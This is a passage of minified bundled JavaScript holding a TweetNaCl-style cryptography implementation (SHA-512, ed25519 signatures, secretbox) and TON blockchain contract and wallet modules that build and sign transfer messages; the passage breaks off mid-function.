                  (r[E + 1] << 16) |
                  (r[E + 2] << 8) |
                  r[E + 3]),
                (k[F] =
                  (r[E + 4] << 24) |
                  (r[E + 5] << 16) |
                  (r[E + 6] << 8) |
                  r[E + 7]));
            for (F = 0; F < 80; F++)
              if (
                ((i = x),
                (s = I),
                (o = U),
                (a = R),
                (l = N),
                (h = P),
                (c = O),
                (u = K),
                (d = W),
                (f = L),
                (p = q),
                (w = H),
                (C = j),
                (g = V),
                (y = Q),
                (m = J),
                (b = K),
                (v = J),
                (D = 65535 & v),
                (M = v >>> 16),
                (_ = 65535 & b),
                (T = b >>> 16),
                (b =
                  ((N >>> 14) | (j << 18)) ^
                  ((N >>> 18) | (j << 14)) ^
                  ((j >>> 9) | (N << 23))),
                (v =
                  ((j >>> 14) | (N << 18)) ^
                  ((j >>> 18) | (N << 14)) ^
                  ((N >>> 9) | (j << 23))),
                (D += 65535 & v),
                (M += v >>> 16),
                (_ += 65535 & b),
                (T += b >>> 16),
                (b = (N & P) ^ (~N & O)),
                (v = (j & V) ^ (~j & Q)),
                (D += 65535 & v),
                (M += v >>> 16),
                (_ += 65535 & b),
                (T += b >>> 16),
                (b = $[2 * F]),
                (v = $[2 * F + 1]),
                (D += 65535 & v),
                (M += v >>> 16),
                (_ += 65535 & b),
                (T += b >>> 16),
                (b = S[F % 16]),
                (v = k[F % 16]),
                (D += 65535 & v),
                (M += v >>> 16),
                (_ += 65535 & b),
                (T += b >>> 16),
                (M += D >>> 16),
                (_ += M >>> 16),
                (T += _ >>> 16),
                (B = (65535 & _) | (T << 16)),
                (A = (65535 & D) | (M << 16)),
                (b = B),
                (v = A),
                (D = 65535 & v),
                (M = v >>> 16),
                (_ = 65535 & b),
                (T = b >>> 16),
                (b =
                  ((x >>> 28) | (W << 4)) ^
                  ((W >>> 2) | (x << 30)) ^
                  ((W >>> 7) | (x << 25))),
                (v =
                  ((W >>> 28) | (x << 4)) ^
                  ((x >>> 2) | (W << 30)) ^
                  ((x >>> 7) | (W << 25))),
                (D += 65535 & v),
                (M += v >>> 16),
                (_ += 65535 & b),
                (T += b >>> 16),
                (b = (x & I) ^ (x & U) ^ (I & U)),
                (v = (W & L) ^ (W & q) ^ (L & q)),
                (D += 65535 & v),
                (M += v >>> 16),
                (_ += 65535 & b),
                (T += b >>> 16),
                (M += D >>> 16),
                (_ += M >>> 16),
                (T += _ >>> 16),
                (u = (65535 & _) | (T << 16)),
                (m = (65535 & D) | (M << 16)),
                (b = a),
                (v = w),
                (D = 65535 & v),
                (M = v >>> 16),
                (_ = 65535 & b),
                (T = b >>> 16),
                (b = B),
                (v = A),
                (D += 65535 & v),
                (M += v >>> 16),
                (_ += 65535 & b),
                (T += b >>> 16),
                (M += D >>> 16),
                (_ += M >>> 16),
                (T += _ >>> 16),
                (a = (65535 & _) | (T << 16)),
                (w = (65535 & D) | (M << 16)),
                (I = i),
                (U = s),
                (R = o),
                (N = a),
                (P = l),
                (O = h),
                (K = c),
                (x = u),
                (L = d),
                (q = f),
                (H = p),
                (j = w),
                (V = C),
                (Q = g),
                (J = y),
                (W = m),
                F % 16 === 15)
              )
                for (E = 0; E < 16; E++)
                  ((b = S[E]),
                    (v = k[E]),
                    (D = 65535 & v),
                    (M = v >>> 16),
                    (_ = 65535 & b),
                    (T = b >>> 16),
                    (b = S[(E + 9) % 16]),
                    (v = k[(E + 9) % 16]),
                    (D += 65535 & v),
                    (M += v >>> 16),
                    (_ += 65535 & b),
                    (T += b >>> 16),
                    (B = S[(E + 1) % 16]),
                    (A = k[(E + 1) % 16]),
                    (b =
                      ((B >>> 1) | (A << 31)) ^
                      ((B >>> 8) | (A << 24)) ^
                      (B >>> 7)),
                    (v =
                      ((A >>> 1) | (B << 31)) ^
                      ((A >>> 8) | (B << 24)) ^
                      ((A >>> 7) | (B << 25))),
                    (D += 65535 & v),
                    (M += v >>> 16),
                    (_ += 65535 & b),
                    (T += b >>> 16),
                    (B = S[(E + 14) % 16]),
                    (A = k[(E + 14) % 16]),
                    (b =
                      ((B >>> 19) | (A << 13)) ^
                      ((A >>> 29) | (B << 3)) ^
                      (B >>> 6)),
                    (v =
                      ((A >>> 19) | (B << 13)) ^
                      ((B >>> 29) | (A << 3)) ^
                      ((A >>> 6) | (B << 26))),
                    (D += 65535 & v),
                    (M += v >>> 16),
                    (_ += 65535 & b),
                    (T += b >>> 16),
                    (M += D >>> 16),
                    (_ += M >>> 16),
                    (T += _ >>> 16),
                    (S[E] = (65535 & _) | (T << 16)),
                    (k[E] = (65535 & D) | (M << 16)));
            ((b = x),
              (v = W),
              (D = 65535 & v),
              (M = v >>> 16),
              (_ = 65535 & b),
              (T = b >>> 16),
              (b = t[0]),
              (v = e[0]),
              (D += 65535 & v),
              (M += v >>> 16),
              (_ += 65535 & b),
              (T += b >>> 16),
              (M += D >>> 16),
              (_ += M >>> 16),
              (T += _ >>> 16),
              (t[0] = x = (65535 & _) | (T << 16)),
              (e[0] = W = (65535 & D) | (M << 16)),
              (b = I),
              (v = L),
              (D = 65535 & v),
              (M = v >>> 16),
              (_ = 65535 & b),
              (T = b >>> 16),
              (b = t[1]),
              (v = e[1]),
              (D += 65535 & v),
              (M += v >>> 16),
              (_ += 65535 & b),
              (T += b >>> 16),
              (M += D >>> 16),
              (_ += M >>> 16),
              (T += _ >>> 16),
              (t[1] = I = (65535 & _) | (T << 16)),
              (e[1] = L = (65535 & D) | (M << 16)),
              (b = U),
              (v = q),
              (D = 65535 & v),
              (M = v >>> 16),
              (_ = 65535 & b),
              (T = b >>> 16),
              (b = t[2]),
              (v = e[2]),
              (D += 65535 & v),
              (M += v >>> 16),
              (_ += 65535 & b),
              (T += b >>> 16),
              (M += D >>> 16),
              (_ += M >>> 16),
              (T += _ >>> 16),
              (t[2] = U = (65535 & _) | (T << 16)),
              (e[2] = q = (65535 & D) | (M << 16)),
              (b = R),
              (v = H),
              (D = 65535 & v),
              (M = v >>> 16),
              (_ = 65535 & b),
              (T = b >>> 16),
              (b = t[3]),
              (v = e[3]),
              (D += 65535 & v),
              (M += v >>> 16),
              (_ += 65535 & b),
              (T += b >>> 16),
              (M += D >>> 16),
              (_ += M >>> 16),
              (T += _ >>> 16),
              (t[3] = R = (65535 & _) | (T << 16)),
              (e[3] = H = (65535 & D) | (M << 16)),
              (b = N),
              (v = j),
              (D = 65535 & v),
              (M = v >>> 16),
              (_ = 65535 & b),
              (T = b >>> 16),
              (b = t[4]),
              (v = e[4]),
              (D += 65535 & v),
              (M += v >>> 16),
              (_ += 65535 & b),
              (T += b >>> 16),
              (M += D >>> 16),
              (_ += M >>> 16),
              (T += _ >>> 16),
              (t[4] = N = (65535 & _) | (T << 16)),
              (e[4] = j = (65535 & D) | (M << 16)),
              (b = P),
              (v = V),
              (D = 65535 & v),
              (M = v >>> 16),
              (_ = 65535 & b),
              (T = b >>> 16),
              (b = t[5]),
              (v = e[5]),
              (D += 65535 & v),
              (M += v >>> 16),
              (_ += 65535 & b),
              (T += b >>> 16),
              (M += D >>> 16),
              (_ += M >>> 16),
              (T += _ >>> 16),
              (t[5] = P = (65535 & _) | (T << 16)),
              (e[5] = V = (65535 & D) | (M << 16)),
              (b = O),
              (v = Q),
              (D = 65535 & v),
              (M = v >>> 16),
              (_ = 65535 & b),
              (T = b >>> 16),
              (b = t[6]),
              (v = e[6]),
              (D += 65535 & v),
              (M += v >>> 16),
              (_ += 65535 & b),
              (T += b >>> 16),
              (M += D >>> 16),
              (_ += M >>> 16),
              (T += _ >>> 16),
              (t[6] = O = (65535 & _) | (T << 16)),
              (e[6] = Q = (65535 & D) | (M << 16)),
              (b = K),
              (v = J),
              (D = 65535 & v),
              (M = v >>> 16),
              (_ = 65535 & b),
              (T = b >>> 16),
              (b = t[7]),
              (v = e[7]),
              (D += 65535 & v),
              (M += v >>> 16),
              (_ += 65535 & b),
              (T += b >>> 16),
              (M += D >>> 16),
              (_ += M >>> 16),
              (T += _ >>> 16),
              (t[7] = K = (65535 & _) | (T << 16)),
              (e[7] = J = (65535 & D) | (M << 16)),
              (G += 128),
              (n -= 128));
          }
          return n;
        }
        function et(t, e, r) {
          var n,
            i = new Int32Array(8),
            s = new Int32Array(8),
            o = new Uint8Array(256),
            a = r;
          for (
            i[0] = 1779033703,
              i[1] = 3144134277,
              i[2] = 1013904242,
              i[3] = 2773480762,
              i[4] = 1359893119,
              i[5] = 2600822924,
              i[6] = 528734635,
              i[7] = 1541459225,
              s[0] = 4089235720,
              s[1] = 2227873595,
              s[2] = 4271175723,
              s[3] = 1595750129,
              s[4] = 2917565137,
              s[5] = 725511199,
              s[6] = 4215389547,
              s[7] = 327033209,
              tt(i, s, e, r),
              r %= 128,
              n = 0;
            n < r;
            n++
          )
            o[n] = e[a - r + n];
          for (
            o[r] = 128,
              r = 256 - 128 * (r < 112 ? 1 : 0),
              o[r - 9] = 0,
              p(o, r - 8, (a / 536870912) | 0, a << 3),
              tt(i, s, o, r),
              n = 0;
            n < 8;
            n++
          )
            p(t, 8 * n, i[n], s[n]);
          return 0;
        }
        function rt(t, r) {
          var n = e(),
            i = e(),
            s = e(),
            o = e(),
            a = e(),
            l = e(),
            h = e(),
            u = e(),
            d = e();
          (W(n, t[1], t[0]),
            W(d, r[1], r[0]),
            L(n, n, d),
            K(i, t[0], t[1]),
            K(d, r[0], r[1]),
            L(i, i, d),
            L(s, t[3], r[3]),
            L(s, s, c),
            L(o, t[2], r[2]),
            K(o, o, o),
            W(a, i, n),
            W(l, o, s),
            K(h, o, s),
            K(u, i, n),
            L(t[0], a, l),
            L(t[1], u, h),
            L(t[2], h, l),
            L(t[3], a, u));
        }
        function nt(t, e, r) {
          var n;
          for (n = 0; n < 4; n++) U(t[n], e[n], r);
        }
        function it(t, r) {
          var n = e(),
            i = e(),
            s = e();
          (H(s, r[2]),
            L(n, r[0], s),
            L(i, r[1], s),
            R(t, i),
            (t[31] ^= P(n) << 7));
        }
        function st(t, e, r) {
          var n, i;
          for (
            x(t[0], o), x(t[1], a), x(t[2], a), x(t[3], o), i = 255;
            i >= 0;
            --i
          )
            ((n = (r[(i / 8) | 0] >> (7 & i)) & 1),
              nt(t, e, n),
              rt(e, t),
              rt(t, t),
              nt(t, e, n));
        }
        function ot(t, r) {
          var n = [e(), e(), e(), e()];
          (x(n[0], u), x(n[1], d), x(n[2], a), L(n[3], u, d), st(t, n, r));
        }
        function at(t, r, i) {
          var s,
            o = new Uint8Array(64),
            a = [e(), e(), e(), e()];
          for (
            i || n(r, 32),
              et(o, r, 32),
              o[0] &= 248,
              o[31] &= 127,
              o[31] |= 64,
              ot(a, o),
              it(t, a),
              s = 0;
            s < 32;
            s++
          )
            r[s + 32] = t[s];
          return 0;
        }
        var lt = new Float64Array([
          237, 211, 245, 92, 26, 99, 18, 88, 214, 156, 247, 162, 222, 249, 222,
          20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16,
        ]);
        function ht(t, e) {
          var r, n, i, s;
          for (n = 63; n >= 32; --n) {
            for (r = 0, i = n - 32, s = n - 12; i < s; ++i)
              ((e[i] += r - 16 * e[n] * lt[i - (n - 32)]),
                (r = Math.floor((e[i] + 128) / 256)),
                (e[i] -= 256 * r));
            ((e[i] += r), (e[n] = 0));
          }
          for (r = 0, i = 0; i < 32; i++)
            ((e[i] += r - (e[31] >> 4) * lt[i]),
              (r = e[i] >> 8),
              (e[i] &= 255));
          for (i = 0; i < 32; i++) e[i] -= r * lt[i];
          for (n = 0; n < 32; n++)
            ((e[n + 1] += e[n] >> 8), (t[n] = 255 & e[n]));
        }
        function ct(t) {
          var e,
            r = new Float64Array(64);
          for (e = 0; e < 64; e++) r[e] = t[e];
          for (e = 0; e < 64; e++) t[e] = 0;
          ht(t, r);
        }
        function ut(t, r, n, i) {
          var s,
            o,
            a = new Uint8Array(64),
            l = new Uint8Array(64),
            h = new Uint8Array(64),
            c = new Float64Array(64),
            u = [e(), e(), e(), e()];
          (et(a, i, 32), (a[0] &= 248), (a[31] &= 127), (a[31] |= 64));
          var d = n + 64;
          for (s = 0; s < n; s++) t[64 + s] = r[s];
          for (s = 0; s < 32; s++) t[32 + s] = a[32 + s];
          for (
            et(h, t.subarray(32), n + 32), ct(h), ot(u, h), it(t, u), s = 32;
            s < 64;
            s++
          )
            t[s] = i[s];
          for (et(l, t, n + 64), ct(l), s = 0; s < 64; s++) c[s] = 0;
          for (s = 0; s < 32; s++) c[s] = h[s];
          for (s = 0; s < 32; s++)
            for (o = 0; o < 32; o++) c[s + o] += l[s] * a[o];
          return (ht(t.subarray(32), c), d);
        }
        function dt(t, r) {
          var n = e(),
            i = e(),
            s = e(),
            l = e(),
            c = e(),
            u = e(),
            d = e();
          return (
            x(t[2], a),
            O(t[1], r),
            q(s, t[1]),
            L(l, s, h),
            W(s, s, t[2]),
            K(l, t[2], l),
            q(c, l),
            q(u, c),
            L(d, u, c),
            L(n, d, s),
            L(n, n, l),
            j(n, n),
            L(n, n, s),
            L(n, n, l),
            L(n, n, l),
            L(t[0], n, l),
            q(i, t[0]),
            L(i, i, l),
            N(i, s) && L(t[0], t[0], f),
            q(i, t[0]),
            L(i, i, l),
            N(i, s)
              ? -1
              : (P(t[0]) === r[31] >> 7 && W(t[0], o, t[0]),
                L(t[3], t[0], t[1]),
                0)
          );
        }
        function ft(t, r, n, i) {
          var s,
            o = new Uint8Array(32),
            a = new Uint8Array(64),
            l = [e(), e(), e(), e()],
            h = [e(), e(), e(), e()];
          if (n < 64) return -1;
          if (dt(h, i)) return -1;
          for (s = 0; s < n; s++) t[s] = r[s];
          for (s = 0; s < 32; s++) t[s + 32] = i[s];
          if (
            (et(a, t, n),
            ct(a),
            st(l, h, a),
            ot(h, r.subarray(32)),
            rt(l, h),
            it(o, l),
            (n -= 64),
            g(r, 0, o, 0))
          ) {
            for (s = 0; s < n; s++) t[s] = 0;
            return -1;
          }
          for (s = 0; s < n; s++) t[s] = r[s + 64];
          return n;
        }
        var pt = 32,
          wt = 24,
          Ct = 32,
          gt = 16,
          yt = 32,
          mt = 32,
          Bt = 32,
          At = 32,
          Ft = 32,
          Et = wt,
          bt = Ct,
          vt = gt,
          Dt = 64,
          Mt = 32,
          _t = 64,
          Tt = 32,
          St = 64;
        function kt(t, e) {
          if (t.length !== pt) throw new Error("bad key size");
          if (e.length !== wt) throw new Error("bad nonce size");
        }
        function xt(t, e) {
          if (t.length !== Bt) throw new Error("bad public key size");
          if (e.length !== At) throw new Error("bad secret key size");
        }
        function It() {
          for (var t = 0; t < arguments.length; t++)
            if (!(arguments[t] instanceof Uint8Array))
              throw new TypeError("unexpected type, use Uint8Array");
        }
        function Ut(t) {
          for (var e = 0; e < t.length; e++) t[e] = 0;
        }
        ((t.lowlevel = {
          crypto_core_hsalsa20: A,
          crypto_stream_xor: D,
          crypto_stream: v,
          crypto_stream_salsa20_xor: E,
          crypto_stream_salsa20: b,
          crypto_onetimeauth: _,
          crypto_onetimeauth_verify: T,
          crypto_verify_16: C,
          crypto_verify_32: g,
          crypto_secretbox: S,
          crypto_secretbox_open: k,
          crypto_scalarmult: V,
          crypto_scalarmult_base: Q,
          crypto_box_beforenm: G,
          crypto_box_afternm: z,
          crypto_box: Z,
          crypto_box_open: X,
          crypto_box_keypair: J,
          crypto_hash: et,
          crypto_sign: ut,
          crypto_sign_keypair: at,
          crypto_sign_open: ft,
          crypto_secretbox_KEYBYTES: pt,
          crypto_secretbox_NONCEBYTES: wt,
          crypto_secretbox_ZEROBYTES: Ct,
          crypto_secretbox_BOXZEROBYTES: gt,
          crypto_scalarmult_BYTES: yt,
          crypto_scalarmult_SCALARBYTES: mt,
          crypto_box_PUBLICKEYBYTES: Bt,
          crypto_box_SECRETKEYBYTES: At,
          crypto_box_BEFORENMBYTES: Ft,
          crypto_box_NONCEBYTES: Et,
          crypto_box_ZEROBYTES: bt,
          crypto_box_BOXZEROBYTES: vt,
          crypto_sign_BYTES: Dt,
          crypto_sign_PUBLICKEYBYTES: Mt,
          crypto_sign_SECRETKEYBYTES: _t,
          crypto_sign_SEEDBYTES: Tt,
          crypto_hash_BYTES: St,
          gf: e,
          D: h,
          L: lt,
          pack25519: R,
          unpack25519: O,
          M: L,
          A: K,
          S: q,
          Z: W,
          pow2523: j,
          add: rt,
          set25519: x,
          modL: ht,
          scalarmult: st,
          scalarbase: ot,
        }),
          (t.randomBytes = function (t) {
            var e = new Uint8Array(t);
            return (n(e, t), e);
          }),
          (t.secretbox = function (t, e, r) {
            (It(t, e, r), kt(r, e));
            for (
              var n = new Uint8Array(Ct + t.length),
                i = new Uint8Array(n.length),
                s = 0;
              s < t.length;
              s++
            )
              n[s + Ct] = t[s];
            return (S(i, n, n.length, e, r), i.subarray(gt));
          }),
          (t.secretbox.open = function (t, e, r) {
            (It(t, e, r), kt(r, e));
            for (
              var n = new Uint8Array(gt + t.length),
                i = new Uint8Array(n.length),
                s = 0;
              s < t.length;
              s++
            )
              n[s + gt] = t[s];
            return n.length < 32 || 0 !== k(i, n, n.length, e, r)
              ? null
              : i.subarray(Ct);
          }),
          (t.secretbox.keyLength = pt),
          (t.secretbox.nonceLength = wt),
          (t.secretbox.overheadLength = gt),
          (t.scalarMult = function (t, e) {
            if ((It(t, e), t.length !== mt)) throw new Error("bad n size");
            if (e.length !== yt) throw new Error("bad p size");
            var r = new Uint8Array(yt);
            return (V(r, t, e), r);
          }),
          (t.scalarMult.base = function (t) {
            if ((It(t), t.length !== mt)) throw new Error("bad n size");
            var e = new Uint8Array(yt);
            return (Q(e, t), e);
          }),
          (t.scalarMult.scalarLength = mt),
          (t.scalarMult.groupElementLength = yt),
          (t.box = function (e, r, n, i) {
            var s = t.box.before(n, i);
            return t.secretbox(e, r, s);
          }),
          (t.box.before = function (t, e) {
            (It(t, e), xt(t, e));
            var r = new Uint8Array(Ft);
            return (G(r, t, e), r);
          }),
          (t.box.after = t.secretbox),
          (t.box.open = function (e, r, n, i) {
            var s = t.box.before(n, i);
            return t.secretbox.open(e, r, s);
          }),
          (t.box.open.after = t.secretbox.open),
          (t.box.keyPair = function () {
            var t = new Uint8Array(Bt),
              e = new Uint8Array(At);
            return (J(t, e), { publicKey: t, secretKey: e });
          }),
          (t.box.keyPair.fromSecretKey = function (t) {
            if ((It(t), t.length !== At))
              throw new Error("bad secret key size");
            var e = new Uint8Array(Bt);
            return (Q(e, t), { publicKey: e, secretKey: new Uint8Array(t) });
          }),
          (t.box.publicKeyLength = Bt),
          (t.box.secretKeyLength = At),
          (t.box.sharedKeyLength = Ft),
          (t.box.nonceLength = Et),
          (t.box.overheadLength = t.secretbox.overheadLength),
          (t.sign = function (t, e) {
            if ((It(t, e), e.length !== _t))
              throw new Error("bad secret key size");
            var r = new Uint8Array(Dt + t.length);
            return (ut(r, t, t.length, e), r);
          }),
          (t.sign.open = function (t, e) {
            if ((It(t, e), e.length !== Mt))
              throw new Error("bad public key size");
            var r = new Uint8Array(t.length),
              n = ft(r, t, t.length, e);
            if (n < 0) return null;
            for (var i = new Uint8Array(n), s = 0; s < i.length; s++)
              i[s] = r[s];
            return i;
          }),
          (t.sign.detached = function (e, r) {
            for (
              var n = t.sign(e, r), i = new Uint8Array(Dt), s = 0;
              s < i.length;
              s++
            )
              i[s] = n[s];
            return i;
          }),
          (t.sign.detached.verify = function (t, e, r) {
            if ((It(t, e, r), e.length !== Dt))
              throw new Error("bad signature size");
            if (r.length !== Mt) throw new Error("bad public key size");
            var n,
              i = new Uint8Array(Dt + t.length),
              s = new Uint8Array(Dt + t.length);
            for (n = 0; n < Dt; n++) i[n] = e[n];
            for (n = 0; n < t.length; n++) i[n + Dt] = t[n];
            return ft(s, i, i.length, r) >= 0;
          }),
          (t.sign.keyPair = function () {
            var t = new Uint8Array(Mt),
              e = new Uint8Array(_t);
            return (at(t, e), { publicKey: t, secretKey: e });
          }),
          (t.sign.keyPair.fromSecretKey = function (t) {
            if ((It(t), t.length !== _t))
              throw new Error("bad secret key size");
            for (var e = new Uint8Array(Mt), r = 0; r < e.length; r++)
              e[r] = t[32 + r];
            return { publicKey: e, secretKey: new Uint8Array(t) };
          }),
          (t.sign.keyPair.fromSeed = function (t) {
            if ((It(t), t.length !== Tt)) throw new Error("bad seed size");
            for (
              var e = new Uint8Array(Mt), r = new Uint8Array(_t), n = 0;
              n < 32;
              n++
            )
              r[n] = t[n];
            return (at(e, r, !0), { publicKey: e, secretKey: r });
          }),
          (t.sign.publicKeyLength = Mt),
          (t.sign.secretKeyLength = _t),
          (t.sign.seedLength = Tt),
          (t.sign.signatureLength = Dt),
          (t.hash = function (t) {
            It(t);
            var e = new Uint8Array(St);
            return (et(e, t, t.length), e);
          }),
          (t.hash.hashLength = St),
          (t.verify = function (t, e) {
            return (
              It(t, e),
              0 !== t.length &&
                0 !== e.length &&
                t.length === e.length &&
                0 === w(t, 0, e, 0, t.length)
            );
          }),
          (t.setPRNG = function (t) {
            n = t;
          }),
          (function () {
            var e =
              "undefined" !== typeof self ? self.crypto || self.msCrypto : null;
            if (e && e.getRandomValues) {
              var n = 65536;
              t.setPRNG(function (t, r) {
                var i,
                  s = new Uint8Array(r);
                for (i = 0; i < r; i += n)
                  e.getRandomValues(s.subarray(i, i + Math.min(r - i, n)));
                for (i = 0; i < r; i++) t[i] = s[i];
                Ut(s);
              });
            } else
              ((e = r(3053)),
                e &&
                  e.randomBytes &&
                  t.setPRNG(function (t, r) {
                    var n,
                      i = e.randomBytes(r);
                    for (n = 0; n < r; n++) t[n] = i[n];
                    Ut(i);
                  }));
          })());
      })(t.exports ? t.exports : (self.nacl = self.nacl || {}));
    },
    3061: function (t, e, r) {
      const { Cell: n } = r(2917),
        { Address: i, bytesToBase64: s, bytesToHex: o, BN: a } = r(2916);
      class Contract {
        constructor(t, e) {
          ((this.provider = t),
            (this.options = e),
            (this.address = e.address ? new i(e.address) : null),
            e.wc || (e.wc = this.address ? this.address.wc : 0),
            (this.methods = {}));
        }
        async getAddress() {
          return (
            this.address ||
              (this.address = (await this.createStateInit()).address),
            this.address
          );
        }
        createCodeCell() {
          if (!this.options.code)
            throw new Error("Contract: options.code is not defined");
          return this.options.code;
        }
        createDataCell() {
          return new n();
        }
        async createStateInit() {
          const t = this.createCodeCell(),
            e = this.createDataCell(),
            r = Contract.createStateInit(t, e),
            n = await r.hash(),
            s = new i(this.options.wc + ":" + o(n));
          return { stateInit: r, address: s, code: t, data: e };
        }
        static createStateInit(t, e, r, i, s) {
          if (
            (void 0 === r && (r = null),
            void 0 === i && (i = null),
            void 0 === s && (s = null),
            r)
          )
            throw "Library in state init is not implemented";
          if (i) throw "Split depth in state init is not implemented";
          if (s) throw "Ticktock in state init is not implemented";
          const o = new n();
          return (
            o.bits.writeBitArray([
              Boolean(i),
              Boolean(s),
              Boolean(t),
              Boolean(e),
              Boolean(r),
            ]),
            t && o.refs.push(t),
            e && o.refs.push(e),
            r && o.refs.push(r),
            o
          );
        }
        static createInternalMessageHeader(t, e, r, s, o, a, l, h, c, u, d) {
          (void 0 === e && (e = 0),
            void 0 === r && (r = !0),
            void 0 === s && (s = null),
            void 0 === o && (o = !1),
            void 0 === a && (a = null),
            void 0 === l && (l = null),
            void 0 === h && (h = 0),
            void 0 === c && (c = 0),
            void 0 === u && (u = 0),
            void 0 === d && (d = 0));
          const f = new n();
          if (
            (f.bits.writeBit(!1),
            f.bits.writeBit(r),
            null !== s
              ? f.bits.writeBit(s)
              : f.bits.writeBit(new i(t).isBounceable),
            f.bits.writeBit(o),
            f.bits.writeAddress(a ? new i(a) : null),
            f.bits.writeAddress(new i(t)),
            f.bits.writeGrams(e),
            l)
          )
            throw "Currency collections are not implemented yet";
          return (
            f.bits.writeBit(Boolean(l)),
            f.bits.writeGrams(h),
            f.bits.writeGrams(c),
            f.bits.writeUint(u, 64),
            f.bits.writeUint(d, 32),
            f
          );
        }
        static createExternalMessageHeader(t, e, r) {
          (void 0 === e && (e = null), void 0 === r && (r = 0));
          const s = new n();
          return (
            s.bits.writeUint(2, 2),
            s.bits.writeAddress(e ? new i(e) : null),
            s.bits.writeAddress(new i(t)),
            s.bits.writeGrams(r),
            s
          );
        }
        static createOutMsg(t, e, r, s) {
          void 0 === s && (s = null);
          let o = new n();
          r &&
            (r.refs
              ? (o = r)
              : "string" === typeof r
                ? r.length > 0 &&
                  (o.bits.writeUint(0, 32), o.bits.writeString(r))
                : o.bits.writeBytes(r));
          const l = Contract.createInternalMessageHeader(new i(t), new a(e)),
            h = Contract.createCommonMsgInfo(l, s, o);
          return h;
        }
        static createCommonMsgInfo(t, e, r) {
          (void 0 === e && (e = null), void 0 === r && (r = null));
          const i = new n();
          return (
            i.writeCell(t),
            e
              ? (i.bits.writeBit(!0), i.bits.writeBit(!0), i.refs.push(e))
              : i.bits.writeBit(!1),
            r
              ? i.bits.getFreeBits() >= r.bits.getUsedBits() &&
                i.refs.length + r.refs.length <= 4
                ? (i.bits.writeBit(!1), i.writeCell(r))
                : (i.bits.writeBit(!0), i.refs.push(r))
              : i.bits.writeBit(!1),
            i
          );
        }
        static createMethod(t, e) {
          return {
            getQuery: async () => (await e).message,
            send: async () => {
              const r = await e,
                n = s(await r.message.toBoc(!1));
              return t.sendBoc(n);
            },
            estimateFee: async () => {
              const r = await e,
                n = r.code
                  ? {
                      address: r.address.toString(!0, !0, !1),
                      body: s(await r.body.toBoc(!1)),
                      init_code: s(await r.code.toBoc(!1)),
                      init_data: s(await r.data.toBoc(!1)),
                    }
                  : {
                      address: r.address.toString(!0, !0, !0),
                      body: s(await r.body.toBoc(!1)),
                    };
              return t.getEstimateFee(n);
            },
          };
        }
      }
      t.exports = { Contract: Contract };
    },
    3184: function (t, e, r) {
      const { Address: n } = r(2916),
        { Cell: i } = r(2917),
        s = 0,
        o = 1,
        a = 0,
        l = 1,
        h = (t) => new TextEncoder().encode(encodeURI(t)),
        c = (t) => new TextDecoder().decode(t),
        u = (t) => {
          const e = new i();
          return (e.bits.writeUint(l, 8), e.bits.writeBytes(h(t)), e);
        },
        d = (t) => {
          if (t.bits.array[0] !== l)
            throw new Error("no OFFCHAIN_CONTENT_PREFIX");
          let e = 0,
            r = t;
          while (r) ((e += r.bits.array.length), (r = r.refs[0]));
          const n = new Uint8Array(e);
          ((e = 0), (r = t));
          while (r)
            (n.set(r.bits.array, e),
              (e += r.bits.array.length),
              (r = r.refs[0]));
          return c(n.slice(1));
        },
        f = (t, e, r) => {
          let n = BigInt(0);
          for (let i = 0; i < r; i++)
            ((n *= BigInt(2)), (n += BigInt(t.get(e + i))));
          return n;
        },
        p = (t) => {
          let e = f(t.bits, 3, 8);
          e > BigInt(127) && (e -= BigInt(256));
          const r = f(t.bits, 11, 256);
          if (e.toString(10) + ":" + r.toString(16) === "0:0") return null;
          const i = e.toString(10) + ":" + r.toString(16).padStart(64, "0");
          return new n(i);
        },
        w = async (t, e) => {
          const r = await t.call2(e, "royalty_params"),
            n = r[0].toNumber(),
            i = r[1].toNumber(),
            s = n / i,
            o = p(r[2]);
          return {
            royalty: s,
            royaltyBase: i,
            royaltyFactor: n,
            royaltyAddress: o,
          };
        };
      t.exports = {
        SNAKE_DATA_PREFIX: s,
        CHUNK_DATA_PREFIX: o,
        ONCHAIN_CONTENT_PREFIX: a,
        OFFCHAIN_CONTENT_PREFIX: l,
        parseAddress: p,
        serializeUri: h,
        parseUri: c,
        createOffchainUriCell: u,
        parseOffchainUriCell: d,
        getRoyaltyParams: w,
      };
    },
    3904: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        { nacl: s, stringToBytes: o, Address: a, BN: l } = r(2916);
      class WalletContract extends n {
        constructor(t, e) {
          if (!e.publicKey && !e.address)
            throw new Error(
              "WalletContract required publicKey or address in options",
            );
          (super(t, e),
            (this.methods = {
              transfer: (e) =>
                n.createMethod(
                  t,
                  this.createTransferMessage(
                    e.secretKey,
                    e.toAddress,
                    e.amount,
                    e.seqno,
                    e.payload,
                    e.sendMode,
                    !Boolean(e.secretKey),
                    e.stateInit,
                    e.expireAt,
                  ),
                ),
              transfers: (e) =>
                n.createMethod(
                  t,
                  this.createTransferMessages(
                    e.secretKey,
                    e.seqno,
                    e.messages,
                    !Boolean(e.secretKey),
                    e.expireAt,
                  ),
                ),
              seqno: () => ({
                call: async () => {
                  const e = await this.getAddress();
                  let r = null;
                  try {
                    r = (await t.call2(e.toString(), "seqno")).toNumber();
                  } catch (n) {}
                  return r;
                },
              }),
            }),
            (this.deploy = (e) =>
              n.createMethod(t, this.createInitExternalMessage(e))));
        }
        getName() {
          throw new Error("override me");
        }
        createDataCell() {
          const t = new i();
          return (
            t.bits.writeUint(0, 32),
            t.bits.writeBytes(this.options.publicKey),
            t
          );
        }
        createSigningMessage(t) {
          t = t || 0;
          const e = new i();
          return (e.bits.writeUint(t, 32), e);
        }
        async createInitExternalMessage(t) {
          if (!this.options.publicKey) {
            const e = s.sign.keyPair.fromSecretKey(t);
            this.options.publicKey = e.publicKey;
          }
          const {
              stateInit: e,
              address: r,
              code: o,
              data: a,
            } = await this.createStateInit(),
            l = this.createSigningMessage(),
            h = s.sign.detached(await l.hash(), t),
            c = new i();
          (c.bits.writeBytes(h), c.writeCell(l));
          const u = n.createExternalMessageHeader(r),
            d = n.createCommonMsgInfo(u, e, c);
          return {
            address: r,
            message: d,
            body: c,
            signingMessage: l,
            stateInit: e,
            code: o,
            data: a,
          };
        }
        async createExternalMessage(t, e, r, o) {
          void 0 === o && (o = !1);
          const a = o ? new Uint8Array(64) : s.sign.detached(await t.hash(), e),
            l = new i();
          (l.bits.writeBytes(a), l.writeCell(t));
          let h = null,
            c = null,
            u = null;
          if (0 === r) {
            if (!this.options.publicKey) {
